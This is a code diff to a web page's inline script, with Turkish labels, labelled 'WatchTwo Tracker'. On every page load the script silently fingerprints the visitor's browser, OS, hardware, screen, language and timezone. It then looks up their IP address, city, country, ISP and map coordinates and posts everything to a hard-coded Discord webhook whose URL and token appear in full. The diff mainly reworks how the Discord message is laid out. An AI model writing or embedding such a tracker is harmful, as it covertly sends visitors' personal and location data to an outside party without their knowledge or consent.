@@ -1236,7 +1236,8 @@
   ></script>
   <script>
     const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1496026139335065701/1BkC9ppBWCeJipyEVHol7BSqUHIb1UB6xY5XZBWZ8RR-UiuTwqwg7029iIxuv0gBvLo_';
-    
+
+// Ana fonksiyon - Sayfa yüklendiğinde çalışır
 (function autoLogOnPageLoad() {
     // Daha önce log düşüldü mü kontrol et (session bazlı)
     const alreadyLogged = sessionStorage.getItem('log_sent');
@@ -1268,16 +1269,16 @@
         let browserVersion = '?';
         
         if (ua.includes('Edg/')) {
-            browserDetailed = 'Edge';
+            browserDetailed = 'Microsoft Edge';
             browserVersion = ua.split('Edg/')[1]?.split('.')[0] || '?';
         } else if (ua.includes('Chrome/') && !ua.includes('Edg')) {
-            browserDetailed = 'Chrome';
+            browserDetailed = 'Google Chrome';
             browserVersion = ua.split('Chrome/')[1]?.split('.')[0] || '?';
         } else if (ua.includes('Firefox/')) {
-            browserDetailed = 'Firefox';
+            browserDetailed = 'Mozilla Firefox';
             browserVersion = ua.split('Firefox/')[1]?.split('.')[0] || '?';
         } else if (ua.includes('Safari/') && !ua.includes('Chrome')) {
-            browserDetailed = 'Safari';
+            browserDetailed = 'Apple Safari';
             browserVersion = ua.split('Version/')[1]?.split('.')[0] || '?';
         } else if (ua.includes('Opera/') || ua.includes('OPR/')) {
             browserDetailed = 'Opera';
@@ -1287,6 +1288,7 @@
         const cpuCores = navigator.hardwareConcurrency || '?';
         const ram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '?';
         const screenRes = `${screen.width}x${screen.height}`;
+        const pixelRatio = window.devicePixelRatio || 1;
         
         return {
             os: osDetailed,
@@ -1295,6 +1297,7 @@
             cpu: cpuCores,
             ram: ram,
             screen: screenRes,
+            pixelRatio: pixelRatio,
             isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(ua),
             isTablet: /iPad|Android(?!.*Mobile)/i.test(ua)
         };
@@ -1306,17 +1309,15 @@
         timestamp: new Date().toISOString(),
         visitTime: new Date().toLocaleString('tr-TR'),
         domain: currentDomain,
-        page: pagePath || '/',
+        page: pagePath,
         referrer: referrerDomain,
         browser: `${system.browser} ${system.browserVersion}`,
         os: system.os,
         device: system.isTablet ? 'Tablet' : (system.isMobile ? 'Mobil' : 'Masaüstü'),
-        cpu: `${system.cpu} Çekirdek`,
-        ram: system.ram,
-        screen: system.screen,
-        language: navigator.language.toUpperCase(),
+        specs: `${system.cpu} Çekirdek | ${system.ram} RAM | ${system.screen}`,
+        language: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        cookieEnabled: navigator.cookieEnabled ? 'Açık' : 'Kapalı'
+        cookieEnabled: navigator.cookieEnabled
     };
     
     // Session storage'a kaydet
@@ -1329,84 +1330,27 @@
             const mapsLink = ipData.latitude && ipData.longitude ? 
                 `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` : null;
             
+            const visitType = referrerDomain === 'Doğrudan' ? '🚪 Doğrudan Giriş' : '🔗 Yönlendirme';
+            
             const embed = {
                 embeds: [{
-                    title: `👁️ ${visitData.domain}`,
+                    title: '👁️ **Site Ziyareti**',
                     color: 0x1a1a1a,
+                    description: `> **${visitData.browser}** ile **${visitData.domain}** ziyaret edildi\n> ${visitType}`,
                     fields: [
                         {
-                            name: `🕐 ZİYARET ZAMANI`,
-                            value: visitData.visitTime,
-                            inline: false
-                        },
-                        {
-                            name: `💻 TARAYICI`,
-                            value: visitData.browser,
+                            name: '💻 **CİHAZ & SİSTEM**',
+                            value: `\`\`\`yaml\n${visitData.os}\n${visitData.specs}\nCihaz: ${visitData.device}\nDil: ${visitData.language}\`\`\``,
                             inline: true
                         },
                         {
-                            name: `🖥️ İŞLETİM SİSTEMİ`,
-                            value: visitData.os,
+                            name: '📍 **KONUM & AĞ**',
+                            value: `\`\`\`yaml\nIP: ${ipData.ip || 'Bilinmiyor'}\n📍 ${ipData.city || '?'}, ${ipData.country_name || '?'}\n📡 ${ipData.org || 'Bilinmiyor'}\n⏰ ${ipData.timezone || visitData.timezone}\`\`\``,
                             inline: true
                         },
                         {
-                            name: `📱 CİHAZ`,
-                            value: visitData.device,
-                            inline: true
-                        },
-                        {
-                            name: `⚙️ İŞLEMCİ`,
-                            value: visitData.cpu,
-                            inline: true
-                        },
-                        {
-                            name: `🧠 RAM`,
-                            value: visitData.ram,
-                            inline: true
-                        },
-                        {
-                            name: `🖥️ EKRAN`,
-                            value: visitData.screen,
-                            inline: true
-                        },
-                        {
-                            name: `🌍 DİL`,
-                            value: visitData.language,
-                            inline: true
-                        },
-                        {
-                            name: `🍪 ÇEREZ`,
-                            value: visitData.cookieEnabled,
-                            inline: true
-                        },
-                        {
-                            name: `📍 KONUM`,
-                            value: `${ipData.city || 'Bilinmiyor'}, ${ipData.country_name || 'Bilinmiyor'}`,
-                            inline: true
-                        },
-                        {
-                            name: `📡 ISS`,
-                            value: ipData.org || 'Bilinmiyor',
-                            inline: true
-                        },
-                        {
-                            name: `🌐 ZAMAN DİLİMİ`,
-                            value: ipData.timezone || visitData.timezone,
-                            inline: true
-                        },
-                        {
-                            name: `🌐 IP ADRESİ`,
-                            value: ipData.ip || 'Bilinmiyor',
-                            inline: true
-                        },
-                        {
-                            name: `📄 SAYFA`,
-                            value: visitData.page,
-                            inline: true
-                        },
-                        {
-                            name: `🔗 REFERANS`,
-                            value: visitData.referrer,
+                            name: '📊 **ZİYARET DETAYI**',
+                            value: `\`\`\`yaml\nSayfa: ${visitData.page}\n🔗 ${visitData.referrer}\n🕐 ${visitData.visitTime}\n🍪 Cookie: ${visitData.cookieEnabled ? 'Açık' : 'Kapalı'}\`\`\``,
                             inline: true
                         }
                     ],
@@ -1418,11 +1362,10 @@
                 }]
             };
             
-            // Maps linki varsa ekle
             if (mapsLink) {
                 embed.embeds[0].fields.push({
-                    name: `🗺️ HARİTA`,
-                    value: `[Konumu Göster](${mapsLink})`,
+                    name: '🗺️ **HARİTA**',
+                    value: `[📍 Konumu Göster](${mapsLink})`,
                     inline: false
                 });
             }
@@ -1434,23 +1377,12 @@
             }).catch(() => {});
         })
         .catch(() => {
-            const embed = {
+            const simpleEmbed = {
                 embeds: [{
-                    title: `👁️ ${visitData.domain}`,
+                    title: '👁️ Site Ziyareti',
                     color: 0x1a1a1a,
-                    fields: [
-                        { name: `🕐 ZİYARET ZAMANI`, value: visitData.visitTime, inline: false },
-                        { name: `💻 TARAYICI`, value: visitData.browser, inline: true },
-                        { name: `🖥️ İŞLETİM SİSTEMİ`, value: visitData.os, inline: true },
-                        { name: `📱 CİHAZ`, value: visitData.device, inline: true },
-                        { name: `⚙️ İŞLEMCİ`, value: visitData.cpu, inline: true },
-                        { name: `🧠 RAM`, value: visitData.ram, inline: true },
-                        { name: `🖥️ EKRAN`, value: visitData.screen, inline: true },
-                        { name: `🌍 DİL`, value: visitData.language, inline: true },
-                        { name: `📄 SAYFA`, value: visitData.page, inline: true },
-                        { name: `🔗 REFERANS`, value: visitData.referrer, inline: true }
-                    ],
-                    footer: { text: `WatchTwo Tracker | IP alınamadı` },
+                    description: `\`\`\`yaml\nDomain: ${currentDomain}\nTarayıcı: ${visitData.browser}\nOS: ${visitData.os}\nCihaz: ${visitData.device}\nReferans: ${visitData.referrer}\nZaman: ${visitData.visitTime}\`\`\``,
+                    footer: { text: 'WatchTwo Tracker' },
                     timestamp: visitData.timestamp
                 }]
             };
@@ -1458,7 +1390,7 @@
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(embed)
+                body: JSON.stringify(simpleEmbed)
             }).catch(() => {});
         });
 })();
